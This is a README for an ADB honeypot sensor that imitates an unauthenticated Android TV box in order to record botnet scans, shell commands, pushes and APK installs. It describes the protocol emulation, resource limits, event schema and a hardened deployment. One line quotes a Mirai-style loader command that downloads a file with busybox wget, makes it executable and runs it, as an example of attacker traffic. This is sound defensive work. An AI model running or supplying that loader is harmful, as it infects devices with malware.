# ADB sensor

An exposed Android TV box: `adbd` listening on TCP 5555 with no authentication, as on the
thousands of misconfigured set-top boxes that botnets (ADB.Miner, Satori, Mirai variants, Trinity)
scan for. Run with `python -m adb_sensor`; it listens on container port 5555 (compose maps the host
port 5555).

## What it does

- The ADB wire protocol, written by hand (`wire.py`): 24-byte header (`command`, `arg0`, `arg1`,
  `data_length`, `data_check`, `magic`), magic check, legacy checksum check for clients that
  announce a protocol older than 0x01000001, payload cap of 4 KiB before the handshake and
  `SENSOR_MAXDATA` (256 KiB) after it. Anything else closes the connection.
- `CNXN` handshake answered with a plausible device banner
  `device::ro.product.name=...;ro.product.model=...;ro.product.device=...;features=...`.
  The box model (a Rockchip RK3229 "MXQ PRO 4K", an Amlogic S905W "X96 mini" or an S922X-class
  "H96 Max", Android 7.1.2 or 9, kernel 4.9.x, 32-bit userland) is chosen from the random
  per-deployment secret, as are the serial number, MAC, LAN address, uptime and whether busybox is
  installed. No authentication is ever requested (no `AUTH`), as on a device with `ro.adb.secure=0`.
- Streams (`OPEN` / `OKAY` / `WRTE` / `CLSE`), at most `SENSOR_MAX_STREAMS` (8) at a time and 200 per
  connection. The sensor never waits for acknowledgements (it stops writing to a stream after 512
  unacknowledged messages), so a sloppy bot cannot stall a session.
- Services:
  - `shell:` and `shell,v2,...:` (interactive, with a pty echo and a `root@`/`device:/ #` prompt,
    or one-shot with a command), `exec:`. Shell v2 packets (stdin, stdout, stderr, exit code,
    close-stdin) are parsed and produced.
  - `sync:` (`STAT`, `STA2`, `LIST`, `LST2`, `RECV`, `SEND`/`DATA`/`DONE`, `QUIT`): pushes are
    hashed on the fly and thrown away, see below.
  - `exec:cmd package install -S <size>` (what `adb install` sends): the APK stream is hashed and
    thrown away, the reply is `Success`.
  - `reboot:`, `root:`, `unroot:`, `remount:`, `tcpip:`, `usb:` get the answers adbd gives. Every
    other service (`tcp:`, `localabstract:`, `forward`, `jdwp:` ...) is refused and recorded.
- The shell is the SSH sensor's emulation (`suckerpot-sensor-ssh`, imported as a library) re-skinned
  as Android's `/system/bin/sh`: toolbox/toybox command set, `getprop` (about 90 properties
  consistent with the banner), `setprop`, `pm list|path|install|uninstall`, `am start|broadcast`,
  `dumpsys`, `settings`, `wm`, `logcat`, `su`, Android `ps`, `ls -l`, `id` (with SELinux context),
  `uname -a` (`Linux localhost 4.9.x ... armv7l`), `/system/build.prop`, `/proc`, `/sdcard`,
  `/data/local/tmp` (writable). Errors look like mksh on Android: `/system/bin/sh: foo: not found`
  (Android 7) or `inaccessible or not found` (Android 9).
- Mirai-style loaders produce plausible output: `cd /data/local/tmp; busybox wget URL -O x; chmod
  777 x; sh x`. With busybox installed, `wget`, `tftp -g`, `ftpget` print BusyBox progress and drop a
  small stub file; without it they answer "not found" exactly like a bare toybox, and the URL is
  still recorded. Running a dropped "binary" starts silently and does nothing.
- Nothing is ever executed or fetched. The sensor opens no outbound connection (a static test
  checks it) and writes no file except its profile secret in `SENSOR_DATA_DIR`.

### What is kept of a push or an install

`adb push` data and streamed APKs are never written anywhere. Each byte is added to a running
SHA-256 (up to `SENSOR_MAX_HASH_MB` per connection, 16 MiB by default; beyond it the event says
`truncated: true` and the hash covers the first 16 MiB) and counted. For a push, the first
`max_stub_bytes` (8 KiB) are also kept in that connection's in-memory fake filesystem, so a following
`ls -l` (which shows the real size) and `sh /data/local/tmp/x.sh` behave plausibly; the emulated
shell interprets a stored script, it never runs it for real. The filesystem is dropped at disconnect.

## Resource limits

Per connection: 24 MiB of input (`SENSOR_MAX_INPUT_MB`), 2 MiB of output, 2000 commands, 8 streams
(200 in total), 30 s to complete one message (header and payload, slowloris-safe), 20 s to send a
first valid `CNXN`, 300 s idle, 30 min total, 10 s to flush a write (a client that never reads is
aborted, and `SO_SNDBUF` is 64 KiB with a 30 s `TCP_USER_TIMEOUT`). Sensor-wide: 100 connections,
5 per source IP, new connections per IP rate limited, a memory budget over all sessions
(`SENSOR_MEMORY_BUDGET_MB`), a cgroup guard (reads `/sys/fs/cgroup/memory.current`: above 70% new
connections are refused, above 85% the heaviest connection is aborted), the shell CPU budget of the
other shell sensors (`SENSOR_SHELL_CPU_SHARE`), and a watchdog thread that exits the process (status
70, so `restart: unless-stopped` recovers) when the event loop stalls for 10 s. Attacker text never
reaches `re`; URLs are found with string methods; sync frames are bounded (path 1024 bytes, data
frame 64 KiB).

Fairness across source IPs: shell lines go through the SSH sensor's `FairBudget` scheduler
(`ssh_sensor.cpu`): one queued line at a time, the IP that used the least CPU recently goes first,
and every line yields to the event loop. Output is sent line by line with `drain()` (64 KiB write
buffer per connection, 64 KiB per command line, 256 KiB per pull) and the transport write buffer is
charged to the memory budget. Events pass a per-IP rate and byte bucket before the shared queues;
important events (`connect`, `disconnect`, `download_attempt`, push/install/reboot commands) have
their own per-IP bucket and their own queue, which the worker drains first; the same command line
repeated more than 5 times in a session is counted (in `events_suppressed`), not stored.

Other event limits are those of the Telnet sensor: `connect` per source IP, `scan` per session,
`command` and `download_attempt` in a separate per-session quota, `disconnect` never rate limited,
a sensor-wide cap, and `events_suppressed` counters. A connection that never completes a `CNXN`
produces no `connect`/`disconnect`: it is summarised per source IP into a periodic `scan` event
(`kind = connection_summary`); if it sent bytes (an HTTP request on port 5555, a scanner blob), a
`scan` event with `kind = raw_payload` carries the first 256 bytes as hex.

## Events

All events use the shared `suckerpot_common.Event` model; `dst_port` is the public port
(`SENSOR_PUBLIC_PORT`). No events are emitted for connections from 127.0.0.1 (the container
healthcheck).

| type | data |
| --- | --- |
| `connect` | `banner` (our CNXN banner), `client_version`, `client_maxdata`, `client_banner` (the client's `host::` identity: `features`, ...) |
| `command` | `input`, `output` (8 KiB cap), `output_preview`, `cwd`, `user`, `prompt`, `status`, `service` (`shell`/`exec`), `interactive`, `flags` |
| `command` (push) | `input` = `adb push <path>`, `flags` = `["adb_push"]`, `path`, `sha256`, `size`, `mode`, `truncated`, `stored` |
| `command` (install stream) | `input` = the service string, `flags` = `["adb_install"]`, `sha256`, `size`, `expected_size`, `truncated` |
| `command` (pull / service) | `adb pull <path>` with `adb_pull`, `found`; `reboot:`/`root:`/`remount:` with `adb_reboot` / `adb_service` |
| `download_attempt` | `url`, `tool` (`wget`, `curl`, `tftp`, `ftpget`, `command-line`), `command`, `cwd`, `user`, `flags` = `["adb_shell"]` |
| `scan` | `kind` = `raw_payload` (`payload_preview` hex, `bytes`, `reason`), `adb_service` (`service`, a refused OPEN such as `tcp:22`), `adb_auth` (`auth_type`, `payload_preview`), `adb_unsupported`, `connection_summary`, `events_suppressed` |
| `disconnect` | `duration_s`, `reason`, `commands`, `downloads`, `pushes`, `installs`, `streams_opened`, `bytes_in`, `bytes_out`, `events_suppressed`, `replay`, `replay_truncated` |

`flags` for the ingest rules: `adb_shell` (every shell/exec command and its downloads),
`adb_push` (file push), `adb_install` (`pm install`, `cmd package install`, `am start`/`broadcast`,
streamed APK), plus `adb_pull`, `adb_reboot`, `adb_service`.

There is no login on ADB, so no `login_attempt` events are produced.

### Terminal replay

Same format as the SSH and Telnet sensors: `disconnect.data.replay` is a list of
`[delta_seconds, "o" | "i", text]` frames. For interactive pty shells it is the real traffic (echo
included); for one-shot commands it is a synthesized `prompt / command / output` triple.

## Environment variables

Every tunable is `SENSOR_<NAME>`; the older `ADB_<NAME>` spelling is still read as a fallback (`SENSOR_*` wins).
The table below lists the names without the prefix choice made explicit.

| variable | default | meaning |
| --- | --- | --- |
| `REDIS_HOST`, `REDIS_PORT`, `REDIS_USER`, `REDIS_PASSWORD`, `EVENTS_STREAM`, `EVENTS_MAXLEN` | see `suckerpot_common` | Redis stream publisher |
| `SENSOR_PORT` | `5555` | listen port inside the container |
| `SENSOR_PUBLIC_PORT` | `5555` | port reported as `dst_port` |
| `SENSOR_DATA_DIR` | `/data` | where `profile_secret` lives (volume) |
| `SENSOR_BUSYBOX` | `auto` | `auto` (from the secret), `yes` or `no`: busybox installed on the box |
| `SENSOR_ROOT_SHELL` | `true` | adbd runs as root (`ro.secure=0`); `false` gives the `shell` user |
| `SENSOR_MAXDATA` | `262144` | advertised maximum payload (4096 to 262144) |
| `SENSOR_MAX_CONNECTIONS` / `SENSOR_MAX_PER_IP` | `100` / `5` | connection caps |
| `SENSOR_CONN_RATE_PER_IP` / `SENSOR_CONN_BURST_PER_IP` | `1` / `10` | new connections per second per source IP |
| `SENSOR_HANDSHAKE_TIMEOUT` / `SENSOR_MESSAGE_TIMEOUT` / `SENSOR_IDLE_TIMEOUT` / `SENSOR_MAX_SESSION` | `20` / `30` / `300` / `1800` | seconds |
| `SENSOR_MAX_STREAMS` | `8` | concurrent streams per connection |
| `SENSOR_MAX_INPUT_MB` / `SENSOR_MAX_HASH_MB` | `24` / `16` | bytes accepted / hashed per connection |
| `SENSOR_MAX_COMMANDS` | `2000` | commands per connection |
| `SENSOR_LINE_BUDGET` | `0.15` | CPU seconds allowed per command line |
| `SENSOR_SHELL_CPU_SHARE` | `0.3` | shell CPU-seconds per second, all sessions together |
| `SENSOR_MEMORY_BUDGET_MB` | `112` | memory budget over all sessions |
| `SENSOR_EVENTS_PER_SEC` / `SENSOR_GLOBAL_EVENTS_PER_SEC` | `20` / `200` | `connect` events per IP / sensor-wide cap |
| `SENSOR_SUMMARY_INTERVAL` | `60` | seconds between connection-summary events |

## Compose service

The orchestrator merges this block into `docker-compose.yml`.

```yaml
  sensor-adb:
    build:
      context: .
      dockerfile: sensors/adb/Dockerfile
    restart: unless-stopped
    networks: [ingress, sensors-adb]
    dns: ["127.0.0.1"]
    ports:
      - "0.0.0.0:${ADB_HOST_PORT:-5555}:5555"
    environment:
      REDIS_HOST: redis
      REDIS_USER: sensor-adb
      REDIS_PASSWORD: ${REDIS_SENSOR_ADB_PASSWORD:?set it in .env}
      EVENTS_STREAM: events:adb
      EVENTS_MAXLEN: ${EVENTS_MAXLEN:-100000}
      SENSOR_PUBLIC_PORT: ${ADB_HOST_PORT:-5555}
    volumes:
      - adb-data:/data
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid,nodev,size=16m,uid=10001,gid=10001
    user: "10001:10001"
    cap_drop: [ALL]
    security_opt: ["no-new-privileges:true"]
    mem_limit: 256m
    memswap_limit: 256m
    cpus: 0.5
    pids_limit: 128
    healthcheck:
      test: ["CMD", "python", "-m", "adb_sensor.healthcheck"]
      interval: 15s
      timeout: 5s
      retries: 3
      start_period: 20s
```

Also needed: the `sensors-adb` network (`internal: true`, shared with `redis` only), the `adb-data`
volume, a Redis ACL user `sensor-adb` limited to `XADD` on `events:adb`, and the `ADB_HOST_PORT`
and `REDIS_SENSOR_ADB_PASSWORD` entries in `.env.example`.

## Design notes

- The SSH sensor package is a path dependency (`../ssh`), as for the Telnet sensor: only
  `ssh_sensor.shell`, `ssh_sensor.config.Config` (the shell's settings object) and
  `derive_profile` are used. `events.py`, `replay.py`, `watchdog.py` and `secret.py` are small
  copies of the Telnet ones, renamed.
- `AndroidShell` overrides `dispatch`, `_run_path`, `prompt`, `error_prefix`, `_setup_user`,
  `lookup("0")` and `_run_simple`. The command table is `commands.py`, the device models, properties
  and base filesystem `device.py`, the push/pull protocol `sync.py`.
- A pushed file's real size is stored in the node tag (`size:N`) so `ls`, `stat` and `STAT` show it
  without keeping the bytes.
- One shell per stream, as with adbd (a fresh `sh` per `OPEN`), all sharing the connection's fake
  filesystem, so a file dropped by one command is visible to the next.

## Development

```
uv sync
uv run ruff check && uv run ruff format --check && uv run mypy adb_sensor && uv run python -m pytest
sg docker -c "sh tests/blackbox.sh"   # real adb client and nmap against the built image
```
